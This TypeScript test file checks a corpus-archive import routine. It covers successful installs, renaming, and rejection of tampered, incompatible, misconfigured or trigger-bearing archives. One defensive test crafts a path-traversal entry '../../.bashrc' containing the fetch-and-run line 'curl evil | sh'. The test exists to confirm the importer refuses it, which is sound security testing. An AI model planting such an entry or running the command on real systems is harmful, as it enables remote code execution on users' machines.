import assert from "node:assert/strict";
import { describe, it } from "node:test";

import {
  JsonArchiveCodec,
  RecordingInstaller,
  StubInspector,
  fixtureHasher,
} from "../../__fixtures__/archive-fakes.ts";
import { ArchiveError, ConfigError, IncompatibleCorpusError, NotFoundError } from "../../domain/errors.ts";
import { CHUNKING_SCHEMA_VERSION, SCHEMA_VERSION } from "../../domain/model/corpus-identity.ts";
import {
  ARCHIVE_ENTRIES,
  ARCHIVE_FORMAT_VERSION,
  describeFile,
  serializeManifest,
  type CorpusManifest,
} from "../../domain/model/corpus-manifest.ts";
import { chunkingFingerprint } from "../../domain/service/chunker.ts";
import { defaultCorpusConfig, type CorpusConfig } from "../config.ts";
import { WarningCode } from "../dto/contracts.ts";
import type { ArchiveEntry, DatabaseInspection } from "../ports/archive.ts";
import { importCorpus, type ImportDependencies } from "./import-corpus.ts";

const encoder = new TextEncoder();
const codec = new JsonArchiveCodec();
const config = defaultCorpusConfig("docs");
const FINGERPRINT = chunkingFingerprint(fixtureHasher.hashText, config.chunking);
const DATABASE = Uint8Array.from([0x53, 0x51, 0x4c, 0x00, 0x01, 0xff]);

/** Enough of a config for the use case: a name, and chunking to fingerprint. */
const serializeConfig = (value: CorpusConfig): string =>
  `${JSON.stringify({ version: 1, name: value.name, chunking: value.chunking })}\n`;

const parseConfig = (input: unknown): CorpusConfig => {
  const record = (input ?? {}) as { name?: unknown; chunking?: Partial<CorpusConfig["chunking"]> };
  if (typeof record.name !== "string") throw new ConfigError('config is missing "name"');
  const base = defaultCorpusConfig(record.name);
  return { ...base, chunking: { ...base.chunking, ...(record.chunking ?? {}) } };
};

function manifestFor(
  configText: string,
  database: Uint8Array,
  overrides: Partial<CorpusManifest> = {},
): CorpusManifest {
  return {
    formatVersion: ARCHIVE_FORMAT_VERSION,
    corpus: "docs",
    createdAt: "2026-09-15T00:00:00.000Z",
    createdBy: "graphdog 0.1.0",
    builtAt: "2026-09-14T00:00:00.000Z",
    identity: {
      schemaVersion: SCHEMA_VERSION,
      chunkingSchemaVersion: CHUNKING_SCHEMA_VERSION,
      embeddingId: "hash-v1:d256",
      chunkingFingerprint: FINGERPRINT,
    },
    counts: { documents: 2, chunks: 5, nodes: 3, edges: 2 },
    sources: [{ id: "docs", revision: null }],
    files: {
      [ARCHIVE_ENTRIES.config]: describeFile(encoder.encode(configText), fixtureHasher.hashBytes),
      [ARCHIVE_ENTRIES.database]: describeFile(database, fixtureHasher.hashBytes),
    },
    ...overrides,
  };
}

const DEFAULT_MANIFEST = manifestFor(serializeConfig(config), DATABASE);

function buildArchive(
  options: {
    configText?: string;
    manifest?: Partial<CorpusManifest>;
    entries?: (entries: ArchiveEntry[]) => ArchiveEntry[];
  } = {},
): Uint8Array {
  const configText = options.configText ?? serializeConfig(config);
  const manifest = manifestFor(configText, DATABASE, options.manifest);
  const entries: ArchiveEntry[] = [
    { name: ARCHIVE_ENTRIES.manifest, data: encoder.encode(serializeManifest(manifest)) },
    { name: ARCHIVE_ENTRIES.config, data: encoder.encode(configText) },
    { name: ARCHIVE_ENTRIES.database, data: DATABASE },
  ];
  return codec.encode(options.entries === undefined ? entries : options.entries(entries));
}

function inspectionFor(manifest: CorpusManifest, overrides: Partial<DatabaseInspection> = {}): DatabaseInspection {
  return {
    foreignObjects: [],
    identity: { ...manifest.identity },
    builtAt: manifest.builtAt,
    counts: { ...manifest.counts },
    sources: manifest.sources,
    failures: 0,
    ...overrides,
  };
}

function setup(
  options: {
    archive?: Uint8Array;
    inspection?: DatabaseInspection;
    readArchive?: (path: string) => Promise<Uint8Array>;
  } = {},
): { dependencies: ImportDependencies; inspector: StubInspector; installer: RecordingInstaller; archive: Uint8Array } {
  const archive = options.archive ?? buildArchive();
  const inspector = new StubInspector(options.inspection ?? inspectionFor(DEFAULT_MANIFEST));
  const installer = new RecordingInstaller();
  return {
    archive,
    inspector,
    installer,
    dependencies: {
      codec,
      hasher: fixtureHasher,
      inspector,
      installer,
      readArchive: options.readArchive ?? (async () => archive),
      parseConfig,
      serializeConfig,
    },
  };
}

async function refuses(
  run: () => Promise<unknown>,
  type: new (...args: never[]) => Error,
  pattern: RegExp,
): Promise<Error> {
  let caught: unknown;
  await assert.rejects(run, (error: unknown) => {
    caught = error;
    return true;
  });
  assert.ok(caught instanceof type, `expected ${type.name}, got ${String(caught)}`);
  assert.match((caught as Error).message, pattern);
  return caught as Error;
}

describe("application/usecase/importCorpus", () => {
  describe("a sound archive", () => {
    it("installs it under its own name, with the exact database bytes", async () => {
      const { dependencies, installer } = setup();
      await importCorpus({ archivePath: "docs.gdog" }, dependencies);
      assert.equal(installer.requests.length, 1);
      assert.equal(installer.requests[0]?.name, "docs");
      assert.deepEqual(installer.requests[0]?.database, DATABASE);
      assert.equal(installer.requests[0]?.replace, false);
    });

    it("reports where it landed, the archive's checksum, and what it contained", async () => {
      const { dependencies, archive } = setup();
      const outcome = await importCorpus({ archivePath: "docs.gdog" }, dependencies);
      assert.equal(outcome.operation, "import");
      assert.equal(outcome.corpus, "docs");
      assert.equal(outcome.bytes, archive.length);
      assert.equal(outcome.checksum, fixtureHasher.hashBytes(archive));
      assert.deepEqual(outcome.destination, { path: "/workspace/corpora/docs", scope: "home", replaced: false });
      assert.deepEqual(outcome.manifest, DEFAULT_MANIFEST);
      assert.deepEqual(outcome.warnings, []);
    });

    it("installs under another name when asked, rewriting the config but not the manifest", async () => {
      const { dependencies, installer } = setup();
      const outcome = await importCorpus({ archivePath: "docs.gdog", name: "team-docs" }, dependencies);
      assert.equal(installer.requests[0]?.name, "team-docs");
      assert.equal(JSON.parse(installer.requests[0]?.config ?? "{}").name, "team-docs");
      assert.equal(outcome.corpus, "team-docs");
      assert.equal(outcome.manifest.corpus, "docs", "the manifest records where it came from");
    });

    it("passes replace through to the installer", async () => {
      const { dependencies, installer } = setup();
      await importCorpus({ archivePath: "docs.gdog", replace: true }, dependencies);
      assert.equal(installer.requests[0]?.replace, true);
    });

    it("warns when the corpus carries files that failed to index", async () => {
      const { dependencies } = setup({ inspection: inspectionFor(DEFAULT_MANIFEST, { failures: 2 }) });
      const outcome = await importCorpus({ archivePath: "docs.gdog" }, dependencies);
      assert.ok(outcome.warnings.some((warning) => warning.code === WarningCode.PARTIAL_INDEX));
    });
  });

  describe("refusals, none of which install anything", () => {
    it("passes a missing archive through as not-found", async () => {
      const { dependencies, installer } = setup({
        readArchive: async (path) => {
          throw new NotFoundError(`archive not found: ${path}`);
        },
      });
      await refuses(() => importCorpus({ archivePath: "gone.gdog" }, dependencies), NotFoundError, /gone\.gdog/);
      assert.equal(installer.requests.length, 0);
    });

    it("refuses a database whose bytes changed after export, before inspecting it", async () => {
      const tampered = buildArchive({
        entries: (entries) =>
          entries.map((entry) =>
            entry.name === ARCHIVE_ENTRIES.database ? { name: entry.name, data: Uint8Array.from([9, 9, 9, 9, 9, 9]) } : entry,
          ),
      });
      const { dependencies, inspector, installer } = setup({ archive: tampered });
      await refuses(() => importCorpus({ archivePath: "docs.gdog" }, dependencies), ArchiveError, /checksum mismatch/);
      assert.equal(inspector.seen.length, 0, "unverified bytes are never opened, even read-only");
      assert.equal(installer.requests.length, 0);
    });

    it("refuses an archive carrying a path-traversal entry", async () => {
      const hostile = buildArchive({
        entries: (entries) => [...entries, { name: "../../.bashrc", data: encoder.encode("curl evil | sh") }],
      });
      const { dependencies, installer } = setup({ archive: hostile });
      await refuses(() => importCorpus({ archivePath: "docs.gdog" }, dependencies), ArchiveError, /path traversal/);
      assert.equal(installer.requests.length, 0);
    });

    it("refuses a schema this build cannot read, as an incompatibility with a remedy", async () => {
      const newer = buildArchive({ manifest: { identity: { ...DEFAULT_MANIFEST.identity, schemaVersion: "999" } } });
      const { dependencies, installer } = setup({ archive: newer });
      const error = await refuses(
        () => importCorpus({ archivePath: "docs.gdog" }, dependencies),
        IncompatibleCorpusError,
        /cannot import "docs": corpus schema version 999/,
      );
      assert.match(String((error as IncompatibleCorpusError).details["remedy"]), /export it again/);
      assert.equal(installer.requests.length, 0);
    });

    it("refuses a bundled config that is not JSON", async () => {
      const { dependencies, installer } = setup({ archive: buildArchive({ configText: "{ nope" }) });
      await refuses(() => importCorpus({ archivePath: "docs.gdog" }, dependencies), ArchiveError, /not valid JSON/);
      assert.equal(installer.requests.length, 0);
    });

    it("reports an unusable bundled config as a bad archive, not as a local config error", async () => {
      const { dependencies, installer } = setup({ archive: buildArchive({ configText: '{"version":1}' }) });
      await refuses(
        () => importCorpus({ archivePath: "docs.gdog" }, dependencies),
        ArchiveError,
        /not a usable corpus config: config is missing "name"/,
      );
      assert.equal(installer.requests.length, 0);
    });

    it("refuses an archive whose config names a different corpus from its manifest", async () => {
      const { dependencies, installer } = setup({
        archive: buildArchive({ configText: serializeConfig(defaultCorpusConfig("other")) }),
      });
      await refuses(
        () => importCorpus({ archivePath: "docs.gdog" }, dependencies),
        ArchiveError,
        /manifest names corpus "docs" but its config names "other"/,
      );
      assert.equal(installer.requests.length, 0);
    });

    it("refuses an archive whose config would chunk differently from its index", async () => {
      const drifted: CorpusConfig = { ...config, chunking: { ...config.chunking, maxChars: 123 } };
      const { dependencies, installer } = setup({ archive: buildArchive({ configText: serializeConfig(drifted) }) });
      await refuses(
        () => importCorpus({ archivePath: "docs.gdog" }, dependencies),
        ArchiveError,
        /could never be searched/,
      );
      assert.equal(installer.requests.length, 0);
    });

    it("refuses a database that defines triggers or views", async () => {
      const { dependencies, installer } = setup({
        inspection: inspectionFor(DEFAULT_MANIFEST, { foreignObjects: ["trigger:on_meta_update"] }),
      });
      await refuses(() => importCorpus({ archivePath: "docs.gdog" }, dependencies), ArchiveError, /never creates/);
      assert.equal(installer.requests.length, 0);
    });

    it("refuses a manifest that misdescribes the database it vouches for", async () => {
      const { dependencies, installer } = setup({
        inspection: inspectionFor(DEFAULT_MANIFEST, {
          identity: { ...DEFAULT_MANIFEST.identity, embeddingId: "st:multilingual-e5-small" },
        }),
      });
      await refuses(
        () => importCorpus({ archivePath: "docs.gdog" }, dependencies),
        ArchiveError,
        /does not describe the database it carries/,
      );
      assert.equal(installer.requests.length, 0);
    });
  });
});
